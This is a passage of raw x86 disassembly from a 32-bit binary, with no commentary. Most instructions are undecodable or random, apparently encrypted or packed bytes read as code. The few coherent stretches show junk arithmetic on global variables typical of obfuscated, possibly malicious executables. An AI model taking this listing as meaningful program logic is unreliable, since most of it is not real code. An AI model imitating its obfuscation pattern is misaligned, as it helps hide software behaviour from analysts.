  40717a:	jno    0x4071ea
  40717c:	xchg   esp,eax
  40717d:	mov    al,ds:0xb3cdaa83
  407182:	(bad)  
  407183:	adc    eax,0x990c9266
  407188:	test   DWORD PTR [edx],eax
  40718a:	sbb    al,BYTE PTR [esi+ebx*8+0x64]
  40718e:	jecxz  0x407185
  407190:	jl     0x407211
  407192:	retf   0xbeee
  407195:	jp     0x40713a
  407197:	aas    
  407198:	popf   
  407199:	sbb    al,0x38
  40719b:	shr    DWORD PTR [edi-0x7e3b2211],1
  4071a1:	fld    st(7)
  4071a3:	popf   
  4071a4:	cmp    DWORD PTR [eax],esp
  4071a6:	(bad)  
  4071a7:	fild   WORD PTR [esi-0x7f82dcd1]
  4071ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4071ae:	push   eax
  4071af:	imul   esp,edi,0xffffffa2
  4071b2:	(bad)  
  4071b3:	and    al,0xd4
  4071b5:	push   esi
  4071b6:	push   0xad79dd28
  4071bb:	sahf   
  4071bc:	aam    0x66
  4071be:	and    al,ch
  4071c0:	sbb    cl,bl
  4071c2:	cwde   
  4071c3:	scas   al,BYTE PTR es:[edi]
  4071c4:	scas   al,BYTE PTR es:[edi]
  4071c5:	es inc esi
  4071c7:	add    al,0xe2
  4071c9:	dec    edx
  4071ca:	es jge 0x407205
  4071cd:	(bad)  
  4071ce:	mov    ah,0x1f
  4071d0:	xchg   ebp,eax
  4071d1:	mov    ah,0x88
  4071d3:	test   ah,0x56
  4071d6:	aad    0x37
  4071d8:	int    0xd9
  4071da:	not    DWORD PTR [ebp+0x7c31cad3]
  4071e0:	sub    ebx,esp
  4071e2:	dec    ebp
  4071e3:	lock int 0xd1
  4071e6:	pop    esp
  4071e7:	and    edi,DWORD PTR [esi-0x38026d5a]
  4071ed:	inc    ebp
  4071ee:	mov    ds:0x88e6d4d7,eax
  4071f3:	cmp    eax,0xaf4e56a3
  4071f8:	popf   
  4071f9:	test   BYTE PTR [ebx-0x64],cl
  4071fc:	xor    eax,ecx
  4071fe:	pop    ss
  4071ff:	xchg   BYTE PTR [ebp-0x56],dl
  407202:	add    al,0x3c
  407204:	rcr    cl,cl
  407206:	call   0x1653:0x4f8e2ff9
  40720d:	dec    ebp
  40720e:	out    dx,eax
  40720f:	(bad)  
  407210:	mov    bh,0x40
  407212:	fnop   
  407214:	stos   DWORD PTR es:[edi],eax
  407215:	scas   eax,DWORD PTR es:[edi]
  407216:	into   
  407217:	nop
  407218:	xchg   ch,cl
  40721a:	out    dx,eax
  40721b:	xor    BYTE PTR ds:0x85180a79,cl
  407221:	sbb    DWORD PTR [ecx+0x2d],eax
  407224:	mov    ds:0x2bbfb144,eax
  407229:	rep outs dx,BYTE PTR ds:[esi]
  40722b:	mov    esi,0x3ecf9cd5
  407230:	shl    BYTE PTR ds:0xc53f4043,1
  407236:	pop    ds
  407237:	test   DWORD PTR [edx],esp
  407239:	or     al,0xec
  40723b:	int3   
  40723c:	cbw    
  40723e:	dec    eax
  40723f:	and    bl,BYTE PTR [edx]
  407241:	rcr    BYTE PTR [ebp-0x3b],0x9f
  407245:	stos   DWORD PTR es:[edi],eax
  407246:	add    eax,0x80385db0
  40724b:	aad    0x67
  40724d:	xlat   BYTE PTR ds:[ebx]
  40724e:	xchg   ebx,eax
  40724f:	add    DWORD PTR [ebx+0x40],esp
  407252:	fnstenv [ebx+edi*4]
  407255:	rol    BYTE PTR [ebx+0x1ca507db],cl
  40725b:	cld    
  40725c:	imul   BYTE PTR [edi+0x54584d2f]
  407262:	rcl    DWORD PTR [ebp-0x1d],1
  407265:	sbb    ah,BYTE PTR [ecx-0x10]
  407268:	dec    edx
  407269:	imul   edx,ebx,0xffffffeb
  40726c:	xchg   ecx,eax
  40726d:	dec    ebp
  40726e:	je     0x407236
  407270:	xlat   BYTE PTR ds:[ebx]
  407271:	cli    
  407272:	leave  
  407273:	scas   al,BYTE PTR es:[edi]
  407274:	sub    DWORD PTR [ebp+0x10e788cd],0xe77fb221
  40727e:	push   0x18
  407280:	cmp    eax,0x7935e81e
  407285:	adc    eax,0x57f16a53
  40728a:	dec    ebp
  40728b:	mov    eax,0xeef67089
  407290:	xor    DWORD PTR [edx+0x5ab3817c],edi
  407296:	xchg   edx,eax
  407297:	adc    ebx,esi
  407299:	dec    ecx
  40729a:	(bad)  
  40729c:	jae    0x407313
  40729e:	popf   
  40729f:	(bad)  
  4072a0:	mov    ah,0x47
  4072a2:	sbb    al,0x43
  4072a4:	jecxz  0x4072fd
  4072a6:	lods   al,BYTE PTR ds:[esi]
  4072a7:	cdq    
  4072a8:	xchg   edi,eax
  4072a9:	jne    0x407251
  4072ab:	xchg   dx,ax
  4072ad:	mov    ds,WORD PTR [ecx]
  4072af:	jecxz  0x40727d
  4072b1:	push   0x61
  4072b3:	cld    
  4072b4:	loope  0x40725c
  4072b6:	jmp    0x407312
  4072b8:	(bad)  
  4072b9:	test   BYTE PTR [esi+0x3d],0x46
  4072bd:	pop    ecx
  4072be:	pop    esi
  4072bf:	enter  0x9ee9,0x4b
  4072c3:	pusha  
  4072c4:	shr    DWORD PTR [esi],0x56
  4072c7:	les    esp,FWORD PTR [edi-0x60]
  4072ca:	nop
  4072cb:	jle    0x4072fd
  4072cd:	add    esi,DWORD PTR [ebx+0x46]
  4072d0:	mov    edi,0x375ddeae
  4072d5:	and    BYTE PTR [ebx+eax*4-0x38],dh
  4072d9:	sbb    eax,0xf9030855
  4072de:	lods   al,BYTE PTR ds:[esi]
  4072df:	push   esi
  4072e0:	sub    ch,BYTE PTR ds:0x22bec867
  4072e6:	pop    edi
  4072e7:	or     cl,BYTE PTR [edx]
  4072e9:	aaa    
  4072ea:	adc    al,0x37
  4072ec:	loop   0x40733b
  4072ee:	pop    ds
  4072ef:	inc    ebx
  4072f0:	cmp    BYTE PTR cs:[ecx+ebp*2-0x32],bl
  4072f5:	mov    eax,ds:0x46778d65
  4072fa:	mov    ebp,0xc784a823
  4072ff:	push   ebx
  407300:	and    DWORD PTR [esi+0x49a00cb9],0x4
  407307:	dec    ecx
  407308:	cmp    bh,0xe7
  40730b:	and    DWORD PTR [ebx-0x3b16c014],ebx
  407311:	fstp   QWORD PTR [esp+ecx*2]
  407314:	push   eax
  407315:	aas    
  407316:	cmc    
  407317:	js     0x407356
  407319:	pushf  
  40731a:	ss mov dh,0xe6
  40731d:	pop    esi
  40731e:	xchg   esp,eax
  40731f:	mov    ds:0x69084505,al
  407324:	xchg   ebx,ebp
  407326:	xor    eax,0x2637fa62
  40732b:	push   esp
  40732c:	jmp    0x407340
  40732e:	jns    0x4072ce
  407330:	pop    edx
  407331:	data16 mov cl,BYTE PTR [ebp+eiz*8-0x4282ffb7]
  407339:	cmc    
  40733a:	xlat   BYTE PTR ds:[ebx]
  40733b:	test   BYTE PTR [edx-0x10],bl
  40733e:	pop    ecx
  40733f:	addr16 or edi,ecx
  407342:	push   ecx
  407343:	out    0x7c,al
  407345:	ror    esp,1
  407347:	mov    eax,DWORD PTR [ebp-0xc]
  40734a:	add    DWORD PTR ds:0x42fdd1,0x42e803
  407354:	xor    eax,esi
  407356:	add    DWORD PTR ds:0x42fdfd,0x57f6
  407360:	add    eax,edi
  407362:	xor    DWORD PTR ds:0x42e80f,0x2a11
  40736c:	mov    DWORD PTR [ebp-0x18],eax
  40736f:	mov    DWORD PTR [ebp-0x1c],0xf89c853c
  407376:	mov    BYTE PTR [ebp-0x1],0x67
  40737a:	and    DWORD PTR ds:0x42fdfd,0x0
  407384:	mov    eax,ds:0x42fdfd
  407389:	inc    eax
  40738a:	mov    ds:0x42fdfd,eax
  40738f:	cmp    DWORD PTR ds:0x42fdfd,0xe
  407396:	jne    0x4073a2
  40739c:	call   DWORD PTR ds:0x42e55f
  4073a2:	cmp    DWORD PTR ds:0x42fdfd,0xd
  4073a9:	jne    0x4073ba
  4073af:	mov    eax,ds:0x42fdfd
  4073b4:	inc    eax
  4073b5:	mov    ds:0x42fdfd,eax
  4073ba:	cmp    DWORD PTR ds:0x42fdfd,0x1d
  4073c1:	jb     0x407384
  4073c7:	mov    eax,DWORD PTR [ebp-0xc]
  4073ca:	xor    eax,esi
  4073cc:	and    DWORD PTR ds:0x42e228,0xdb
  4073d6:	add    eax,edi
  4073d8:	or     DWORD PTR ds:0x42e807,0x71a5
  4073e2:	mov    DWORD PTR [ebp-0x18],eax
  4073e5:	adc    eax,0x7137
  4073ea:	jmp    0x407737
  4073ef:	or     DWORD PTR ds:[edi],eax
  4073f2:	(bad)  
  4073f3:	rcl    edx,cl
  4073f5:	cmp    DWORD PTR [ecx],edx
  4073f7:	pop    ecx
  4073f8:	jns    0x4073c5
  4073fa:	popa   
  4073fb:	dec    ebp
  4073fc:	fimul  WORD PTR [edx+0x70cff7a0]
  407402:	jo     0x407424
  407404:	jge    0x407476
  407406:	jo     0x40739f
  407408:	dec    eax
  407409:	sbb    eax,0xed17c1c0
  40740e:	loope  0x40743c
  407410:	dec    edi
  407411:	sub    eax,0x119a8e1c
  407416:	dec    ebx
  407417:	out    dx,al
  407418:	xchg   edi,eax
  407419:	sbb    ah,BYTE PTR [edx-0x67bf48f3]
  40741f:	inc    edi
  407420:	jbe    0x4073e8
  407422:	dec    esi
  407423:	adc    eax,DWORD PTR [ebp-0x76756dd8]
  407429:	or     ebx,esp
  40742b:	add    al,0x71
  40742d:	daa    
  40742e:	jmp    0x29a8a3e2
  407433:	xor    al,0x57
  407435:	pushf  
  407436:	loope  0x40740f
  407438:	neg    BYTE PTR [ecx]
  40743a:	adc    ecx,esp
  40743c:	retf   
  40743d:	and    cl,al
  40743f:	pop    edi
  407440:	mov    cl,cl
  407442:	or     eax,0xd4285968
  407447:	sub    dl,al
  407449:	add    BYTE PTR [edi+0xf],ah
  40744c:	sbb    al,0xf5
  40744e:	jg     0x407425
  407450:	lods   eax,DWORD PTR ds:[esi]
  407451:	arpl   dx,ax
  407453:	jns    0x407487
  407455:	push   ebp
  407456:	or     eax,0x28d8fee8
  40745b:	push   edx
  40745c:	div    DWORD PTR [ecx*1-0x3f18ba6a]
  407463:	fld    QWORD PTR [ecx-0x36872363]
  407469:	sub    DWORD PTR [eax+0x7923e89],edi
  40746f:	retf   0x1d4b
  407472:	and    eax,0xa1708817
  407477:	out    dx,eax
  407478:	cmp    DWORD PTR [esi+0x12],edx
  40747b:	jg     0x40746e
  40747d:	and    eax,0x193d7d1e
  407482:	jo     0x4074bd
  407484:	inc    ebx
  407485:	jne    0x407496
  407487:	xor    DWORD PTR [ebx-0x6fbb9866],0x5098b338
  407491:	leave  
  407492:	mov    esp,0x5a5099fd
  407497:	clc    
  407498:	nop
  407499:	popf   
  40749a:	clc    
  40749b:	imul   esp
  40749d:	mov    edi,0x38c87cf0
  4074a2:	sbb    al,0x5c
  4074a4:	xor    eax,0xdabc6c1b
  4074a9:	mov    BYTE PTR ds:0xd324efb,dh
  4074af:	inc    ebp
  4074b0:	inc    esp
  4074b1:	leave  
  4074b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4074b3:	and    BYTE PTR [esi],0x7
  4074b6:	jge    0x407525
  4074b8:	jmp    0xa8c92eb
  4074bd:	or     BYTE PTR [ecx],bh
  4074bf:	dec    esp
  4074c0:	and    BYTE PTR [ebp+0x34],bh
  4074c3:	and    BYTE PTR [ebx+0x1a620f35],cl
  4074c9:	and    ch,bh
  4074cb:	adc    al,0x55
  4074cd:	fnsave [ebx]
  4074cf:	push   ds
  4074d0:	sbb    al,0x33
  4074d2:	aam    0x32
  4074d4:	add    esp,esi
  4074d6:	xchg   esp,eax
  4074d7:	das    
  4074d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4074d9:	outs   dx,DWORD PTR ds:[esi]
  4074da:	sub    al,0xb4
  4074dc:	mov    WORD PTR [esi],fs
  4074de:	icebp  
  4074df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4074e0:	cmp    BYTE PTR fs:[ebx-0x2d8cfb9c],bh
  4074e7:	pusha  
  4074e8:	out    dx,eax
  4074e9:	xchg   ebp,eax
  4074ea:	xchg   ecx,eax
  4074eb:	loope  0x407551
  4074ed:	xor    esp,DWORD PTR [esi-0x78]
  4074f0:	or     eax,0xe0cbe703
  4074f5:	aaa    
  4074f6:	push   esp
  4074f7:	pusha  
  4074f8:	and    ah,BYTE PTR [eax-0x6a14f6fd]
  4074fe:	mov    cl,BYTE PTR [esi+0x70]
  407501:	shl    DWORD PTR [ecx+0x7d],0x91
  407505:	mov    dx,0xfbd1
  407509:	jle    0x4074f4
  40750b:	(bad)  
  40750c:	and    DWORD PTR [ebp-0x136bb469],0x532b24d1
  407516:	int3   
  407517:	(bad)  
  407518:	jmp    0xcd2e0e75
  40751d:	call   0x5e06:0xf0e76957
  407524:	dec    esp
  407525:	imul   esp,eax,0xfffffff0
  407528:	and    eax,0xebdd79df
  40752d:	push   es
  40752e:	push   ds
  40752f:	dec    eax
  407530:	hlt    
  407531:	cmp    al,0xf9
  407533:	repz jb 0x407588
  407536:	cmp    DWORD PTR ds:0x8901ad13,ebp
  40753c:	mov    eax,ds:0xffac329d
  407541:	add    eax,0xf225be28
  407546:	pop    eax
  407547:	pop    esp
  407548:	xor    al,0x44
  40754a:	lahf   
  40754b:	out    0xa3,al
  40754d:	or     esi,DWORD PTR [ebp+0x6b]
  407550:	mov    ah,0x21
  407552:	enter  0x898f,0x8f
  407556:	xor    DWORD PTR ds:0xfd58f77a,0xffffffdd
  40755d:	and    eax,0xfb660b96
  407562:	xchg   ebp,eax
  407563:	es ds mov al,0xa3
  407567:	pop    edx
  407568:	lock out dx,eax
  40756a:	jno    0x4075e6
  40756c:	test   BYTE PTR [esi+0x35],0xef
  407570:	push   ds
  407571:	add    al,0xb
  407573:	fucomp st(0)
  407575:	add    al,0x5f
  407577:	xor    al,BYTE PTR [ecx-0x38ee59da]
  40757d:	imul   ebx,DWORD PTR [esi-0xa59534d],0x2d
  407584:	dec    eax
  407585:	aaa    
  407586:	cmp    eax,0x8a24d1e9
  40758c:	dec    ebp
  40758d:	scas   eax,DWORD PTR es:[edi]
  40758e:	in     al,0x4c
  407590:	repnz fucom st(4)
  407593:	mov    edi,0xb3329774
  407598:	ud2    
  40759a:	leave  
  40759b:	(bad)  
  40759c:	mov    esp,0x35c948ff
  4075a1:	nop
  4075a2:	sbb    ah,BYTE PTR [ecx]
  4075a4:	pop    ds
  4075a5:	mov    bl,0xfd
  4075a7:	mov    al,0x3f
  4075a9:	xchg   ecx,eax
  4075aa:	test   DWORD PTR [edx-0x4515171f],esi
  4075b0:	adc    al,0x4c
  4075b2:	inc    eax
  4075b3:	xchg   esi,eax
  4075b4:	mov    eax,ds:0x6112f2c2
  4075b9:	mov    esi,0x8392fcc9
  4075be:	js     0x407605
  4075c0:	(bad)  
  4075c2:	data16 sub bh,BYTE PTR [ecx]
  4075c5:	loope  0x4075e4
  4075c7:	fisubr WORD PTR [edi]
  4075c9:	cs icebp 
  4075cb:	cdq    
  4075cc:	adc    DWORD PTR [eax+eiz*1-0x6292d254],edi
  4075d3:	dec    edi
  4075d4:	mov    cs,WORD PTR [esi-0x1030a09e]
  4075da:	xchg   ebp,eax
  4075db:	dec    esp
  4075dc:	nop
  4075dd:	pop    esp
  4075de:	aad    0xf4
  4075e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4075e1:	jns    0x40763a
  4075e3:	or     DWORD PTR [ebx-0x4666e40f],edi
  4075e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4075ea:	and    BYTE PTR [esi],ch
  4075ec:	inc    edi
  4075ed:	mov    dl,0x7f
  4075ef:	test   al,0x42
  4075f1:	jl     0x4075dd
  4075f3:	retf   0xf4d5
  4075f6:	scas   al,BYTE PTR es:[edi]
  4075f7:	retf   0x14f3
  4075fa:	(bad)  
  4075fb:	jns    0x407669
  4075fd:	and    DWORD PTR [ebp+eiz*2+0xc],edx
  407601:	push   edx
  407602:	dec    esp
  407603:	ret    0x8715
  407606:	pusha  
  407607:	xchg   ebp,eax
  407608:	add    eax,0x371b5846
  40760d:	add    DWORD PTR [edx+0x12],0x3fc1ad49
  407614:	cli    
  407615:	push   0x8e5d4a11
  40761a:	arpl   WORD PTR [esi+0x56],di
  40761d:	addr16 and cl,0xdf
  407621:	(bad)  
  407622:	sbb    WORD PTR [ebx+0x72],bp
  407626:	jmp    0xec5b:0xab2ad437
  40762d:	ret    
  40762e:	mov    edx,0xd60d5c7b
  407633:	push   ebx
  407634:	es jmp 0xb5c07eb4
  40763a:	push   esp
  40763b:	and    al,0xad
  40763d:	in     eax,dx
  40763e:	or     eax,0x98dfe3f1
  407643:	mov    eax,0xeea5bb21
  407648:	subps  xmm6,XMMWORD PTR [edi-0x54]
  40764c:	pop    edx
  40764d:	jecxz  0x4075f5
  40764f:	push   0x4b
  407651:	mov    eax,ds:0x8aedd88b
  407656:	push   ecx
  407657:	mov    ch,0x46
  407659:	push   esp
  40765a:	or     al,0xf7
  40765c:	into   
  40765d:	push   eax
  40765e:	dec    ebp
  40765f:	fidivr DWORD PTR [ebx+0x1c]
  407662:	mov    edx,es
  407664:	sbb    BYTE PTR ds:0xbf8370d7,ah
  40766a:	and    BYTE PTR [ebp-0x7d735854],dh
  407670:	and    BYTE PTR [ebp-0x7e],dl
  407673:	xchg   ecx,eax
  407674:	mov    al,BYTE PTR [eax]
  407676:	cmp    eax,eax
  407678:	call   0x65132dc4
  40767d:	adc    DWORD PTR [eax-0xe],edi
  407680:	xor    eax,DWORD PTR [ebp+0x41e80d6b]
  407686:	cmp    DWORD PTR [ebx+0x11],eax
  407689:	adc    eax,0x97fb0a3b
  40768e:	sbb    edx,DWORD PTR [ebx+0x5fe48696]
  407694:	outs   dx,DWORD PTR ds:[esi]
  407695:	adc    esi,DWORD PTR [edi]
  407697:	inc    edi
  407698:	sub    al,0x1a
  40769a:	inc    esi
  40769b:	sti    
  40769c:	stos   BYTE PTR es:[edi],al
  40769d:	dec    ebx
  40769e:	call   0x38a4b1a4
  4076a3:	fwait
  4076a4:	or     DWORD PTR [ebx],ebx
  4076a6:	xchg   BYTE PTR [esi],dh
  4076a8:	lods   al,BYTE PTR ds:[esi]
  4076a9:	dec    edi
  4076aa:	cwde   
  4076ab:	jmp    0xa1bb:0x5b38077
  4076b2:	xor    al,0x8f
  4076b4:	mov    eax,ds:0x16554603
  4076b9:	and    al,0x29
  4076bb:	jg     0x407724
  4076bd:	into   
  4076be:	das    
  4076bf:	cs xchg esi,eax
  4076c1:	push   eax
  4076c2:	cli    
  4076c3:	mov    bh,0xa6
  4076c5:	pop    eax
  4076c6:	cmp    edx,DWORD PTR [ecx]
  4076c8:	lahf   
  4076c9:	nop
  4076ca:	xchg   edx,eax
  4076cb:	xchg   ebx,eax
  4076cc:	inc    esi
  4076cd:	in     eax,0x75
  4076cf:	fcom   st(3)
  4076d1:	sbb    DWORD PTR [ebp+0x42],esi
  4076d4:	test   al,0x15
  4076d6:	scas   eax,DWORD PTR es:[edi]
  4076d7:	mov    cl,0xab
  4076d9:	cs sub al,0xef
  4076dc:	fild   QWORD PTR [edx+0x75]
  4076df:	pop    es
  4076e0:	(bad)  
  4076e1:	fstp   QWORD PTR [ecx+0x67]
  4076e4:	aam    0xd0
  4076e6:	sar    cl,1
  4076e8:	inc    esp
  4076e9:	ins    BYTE PTR es:[edi],dx
  4076ea:	add    dh,0x17
  4076ed:	stos   BYTE PTR es:[edi],al
  4076ee:	and    dl,BYTE PTR [ecx-0x607fe3b3]
  4076f4:	push   ebx
  4076f5:	push   cs
  4076f6:	xchg   edx,eax
  4076f7:	mov    ?,WORD PTR [ebp+0x289810bf]
  4076fd:	aaa    
  4076fe:	pop    ds
  4076ff:	jle    0x4076de
  407701:	aas    
  407702:	pop    ss
  407703:	ins    BYTE PTR es:[edi],dx
  407704:	xor    bl,BYTE PTR [ebp-0x4d]
  407707:	push   edi
  407708:	(bad)  
  407709:	fld    DWORD PTR [edx+0x342447aa]
  40770f:	push   eax
  407710:	push   esp
  407711:	popa   
  407712:	mov    ch,0x28
  407714:	lahf   
  407715:	in     al,dx
  407716:	rol    al,0x8a
  407719:	ficom  DWORD PTR [ebp+0x72]
  40771c:	cli    
  40771d:	stc    
  40771e:	push   ebp
  40771f:	sbb    dl,BYTE PTR [ebp-0x77b02d40]
  407725:	or     BYTE PTR [ecx],ah
  407727:	add    esp,DWORD PTR [eax+0x6c]
  40772a:	out    dx,al
  40772b:	lds    edi,FWORD PTR [edi]
  40772d:	inc    edx
  40772e:	sti    
  40772f:	or     esp,DWORD PTR [edi-0x13]
  407732:	lods   eax,DWORD PTR ds:[esi]
  407733:	std    
  407734:	push   ebp
  407735:	test   eax,0xdc458b7b
  40773a:	xor    eax,esi
  40773c:	add    eax,edi
  40773e:	adc    DWORD PTR ds:0x42e21c,0x42fe09
  407748:	push   eax
  407749:	inc    eax
  40774a:	mov    eax,DWORD PTR [ebp-0x28]
  40774d:	sbb    DWORD PTR ds:0x42fdd1,0x6777
  407757:	xor    eax,esi
  407759:	add    eax,edi
  40775b:	push   eax
  40775c:	mov    eax,DWORD PTR [ebp-0x1c]
  40775f:	or     DWORD PTR ds:0x42e7ef,0x4a3f
  407769:	xor    eax,esi
  40776b:	add    DWORD PTR ds:0x42fdf1,0x266c
  407775:	add    eax,edi
  407777:	xor    DWORD PTR ds:0x42e80f,0x42e7eb
  407781:	push   eax
  407782:	lea    eax,[ebp-0x78]
  407785:	push   eax
  407786:	add    DWORD PTR ds:0x42e7ff,0x5eb6
  407790:	push   DWORD PTR [ebp-0xc]
  407793:	adc    DWORD PTR ds:0x42e803,0x2bbb
  40779d:	push   DWORD PTR [ebp-0x14]
  4077a0:	call   0x405e60
  4077a5:	adc    DWORD PTR ds:0x42fde5,0x42fe6e
  4077af:	test   eax,eax
  4077b1:	je     0x407e83
  4077b7:	lea    eax,[ebp-0x78]
  4077ba:	sbb    DWORD PTR ds:0x42fe82,0x6660
  4077c4:	push   eax
  4077c5:	mov    eax,DWORD PTR [ebp-0x14]
  4077c8:	jmp    0x407b15
  4077cd:	xlat   BYTE PTR ds:[ebx]
  4077ce:	and    BYTE PTR [eax+eiz*8+0x73],ch
  4077d2:	ins    BYTE PTR es:[edi],dx
  4077d3:	push   ebx
  4077d4:	aaa    
  4077d5:	pop    edx
  4077d6:	push   ecx
  4077d7:	push   ebx
  4077d8:	sahf   
  4077d9:	and    eax,0xa7ba0847
  4077de:	int3   
  4077df:	jo     0x407851
  4077e1:	and    BYTE PTR [ebp+0x70],bh
  4077e4:	jo     0x4077ac
  4077e6:	mov    edx,0xa087e9ac
  4077eb:	outs   dx,BYTE PTR ds:[esi]
  4077ec:	fs mov dh,0xe
  4077ef:	sub    ecx,edi
  4077f1:	lea    esi,[edi]
  4077f3:	and    BYTE PTR [edx],dh
  4077f5:	imul   ebx,DWORD PTR [esi-0xc],0xffffffe8
  4077f9:	xor    esi,DWORD PTR [edx+0x6e]
  4077fc:	push   eax
  4077fd:	pop    es
  4077fe:	or     esi,DWORD PTR [esi+0xac2bc1c]
  407804:	xor    esi,DWORD PTR [ecx+0x72]
  407807:	(bad)  
  407808:	mov    al,0x54
  40780a:	sub    BYTE PTR [edi],cl
  40780c:	test   BYTE PTR [edi-0x5c],dl
  40780f:	dec    edx
  407810:	jp     0x4077e3
  407812:	add    ebp,DWORD PTR [esi-0x3fbabb37]
  407818:	sahf   
  407819:	into   
  40781a:	cmp    bl,BYTE PTR [esi-0xa]
  40781d:	mov    edx,0x7e5cc71e
  407822:	pop    ebp
  407823:	imul   ebx,esi,0xfffffffd
  407826:	sbb    ch,BYTE PTR [edi-0x7e]
  407829:	leave  
  40782a:	aas    
  40782b:	jnp    0x4077d9
  40782d:	out    0xe7,al
  40782f:	jmp    0xcb9f5f60
  407834:	loope  0x407808
  407836:	mov    ecx,0x914c7fd9
  40783b:	sbb    eax,DWORD PTR gs:[edi]
  40783e:	lods   al,BYTE PTR ds:[esi]
  40783f:	and    sp,cx
  407842:	ss push 0xfffffffa
  407845:	add    dl,BYTE PTR [esi]
  407847:	add    eax,DWORD PTR cs:[ebp-0x66]
  40784b:	sbb    bl,BYTE PTR [bp+di]
  40784e:	cwde   
  40784f:	mov    dh,0xaa
  407851:	pop    ss
  407852:	cmp    eax,0xb4cdcd5c
  407857:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407858:	mov    eax,ds:0xc803aa
  40785d:	and    DWORD PTR ds:0x96256538,edx
  407863:	mov    ?,edx
  407865:	add    al,BYTE PTR [edi]
  407867:	pop    ds
  407868:	adc    BYTE PTR [ebx],bh
  40786a:	test   eax,0x2f4dd136
  40786f:	or     edx,DWORD PTR [edi]
  407871:	pop    edi
  407872:	dec    edi
  407873:	jl     0x407878
  407875:	sub    al,bl
  407877:	mov    bh,BYTE PTR [edi-0x44]
  40787a:	dec    edi
  40787b:	xor    bh,BYTE PTR [ebx+0xc]
  40787e:	push   ebx
  40787f:	(bad)  
  407880:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407881:	dec    esi
  407882:	dec    edx
  407883:	pop    ss
  407884:	adc    DWORD PTR ds:0xa7051c1f,ebp
  40788a:	mov    ecx,0xc2feecc2
  40788f:	in     eax,0xe7
  407891:	xchg   esp,eax
  407892:	outs   dx,BYTE PTR ds:[esi]
  407893:	scas   eax,DWORD PTR es:[edi]
  407894:	jo     0x4078e5
  407896:	dec    ebp
  407897:	idiv   BYTE PTR [eax-0x12]
  40789a:	jne    0x407869
  40789c:	gs push ebp
  40789e:	pop    DWORD PTR [eax+0x7a4a940f]
  4078a4:	sbb    eax,0xa3a6446c
  4078a9:	repz repz enter 0xc794,0xff
  4078af:	sub    ah,dl
  4078b1:	jnp    0x4078e7
  4078b3:	or     eax,0xd4b19bcc
  4078b8:	dec    ebx
  4078b9:	in     al,0x62
  4078bb:	sbb    ebp,DWORD PTR [ebp+0x5295a072]
  4078c1:	xor    al,0xee
  4078c3:	enter  0xc919,0x80
  4078c7:	mov    ds:0x984a7ded,al
  4078cc:	push   edi
  4078cd:	retf   
  4078ce:	nop
  4078cf:	xor    eax,0x185dfde0
  4078d4:	push   0x7f
  4078d6:	in     eax,dx
  4078d7:	sub    eax,0xd29c44ee
  4078dc:	cmp    BYTE PTR [edx+0x454e5a1c],bh
  4078e2:	inc    ebp
  4078e3:	push   ds
  4078e4:	idiv   BYTE PTR [eax-0x2d]
  4078e7:	int3   
  4078e8:	lds    esi,FWORD PTR fs:[ebx+0x7ca86af4]
  4078ef:	sub    ebp,ebp
  4078f1:	(bad)  
  4078f2:	mov    edx,DWORD PTR [ebx-0x1b]
  4078f5:	mov    edi,0x468362c7
  4078fa:	sbb    al,dl
  4078fc:	(bad)  
  4078fd:	int    0xf7
  4078ff:	data16 mov al,ds:0xd233fb88
  407905:	sub    BYTE PTR cs:[eax*8+0x24f6ba89],bh
  40790d:	dec    edx
  40790e:	pop    ecx
  40790f:	xchg   esp,eax
  407910:	dec    esp
  407911:	inc    edx
  407912:	jb     0x40790f
  407914:	adc    eax,eax
  407916:	or     al,0x5
  407918:	pop    esi
  407919:	cmp    eax,0x8a208fe2
  40791e:	xor    ebx,DWORD PTR [ebx-0x58]
  407921:	imul   edx,DWORD PTR [ebx-0x664df95c],0xbdc8fe74
  40792b:	mov    gs,WORD PTR ds:0x2c9edb6b
  407931:	mov    ecx,0x1da1f36d
  407936:	mov    eax,ds:0x5ca6b615
  40793b:	gs pop eax
  40793d:	aam    0xbb
  40793f:	cwde   
  407940:	jl     0x4078ca
  407942:	jbe    0x407983
  407944:	test   DWORD PTR [edi],eax
  407946:	sbb    BYTE PTR [edx+0x598a2f29],0x92
  40794d:	jnp    0x407944
  40794f:	mov    eax,ds:0x178a3c2b
  407954:	data16 fstp QWORD PTR [esi+0x556b7ec6]
  40795b:	cmc    
  40795c:	xor    ah,cl
  40795e:	inc    esp
  40795f:	into   
  407960:	dec    edx
  407961:	mov    eax,ds:0x72d10101
  407966:	sbb    ebp,DWORD PTR [esi-0x46]
  407969:	call   0x42aba1c6
  40796e:	ds inc edi
  407970:	das    
  407971:	pop    esp
  407972:	adc    ebp,DWORD PTR [esi+0x7a]
  407975:	inc    edx
  407976:	in     al,0x93
  407978:	mov    ds:0xe6d43d1d,eax
  40797d:	rol    DWORD PTR [ebx-0x5fea70d3],0xf2
  407984:	(bad)  
  407985:	pop    edx
  407986:	push   0xa24d231a
  40798b:	xchg   DWORD PTR [ebx+0x36610081],esi
  407991:	mov    ebp,0xc37c4c97
  407996:	loopne 0x407961
  407998:	shl    DWORD PTR ds:0x7ea19ad0,1
  40799e:	and    eax,0x78de08ac
  4079a3:	popf   
  4079a4:	shl    BYTE PTR [ecx-0x22],cl
  4079a7:	mov    eax,cs
  4079a9:	arpl   WORD PTR [ecx+0x5d],bp
  4079ac:	arpl   WORD PTR [edi+0x2a72fbe4],di
  4079b2:	test   eax,0xc3df0c1f
  4079b7:	(bad)  
  4079b8:	lock or esp,ebx
  4079bb:	call   0xe096:0xdb31caac
  4079c2:	mov    DWORD PTR [edi+esi*8-0x58f8cd02],edx
  4079c9:	mov    al,BYTE PTR [edx]
  4079cb:	xor    eax,0xb9f64ad5
  4079d0:	sub    eax,0x80ad8935
  4079d5:	sbb    DWORD PTR [eax+0x67e5838b],esi
  4079db:	cmp    al,0xe5
  4079dd:	adc    al,BYTE PTR [ecx]
  4079df:	push   es
  4079e0:	test   eax,0xd793458c
  4079e5:	inc    esi
  4079e6:	and    dl,BYTE PTR [edx+0x40c37d6b]
  4079ec:	icebp  
  4079ed:	in     al,0x86
  4079ef:	jno    0x407a2a
  4079f1:	dec    esi
  4079f2:	jns    0x4079ae
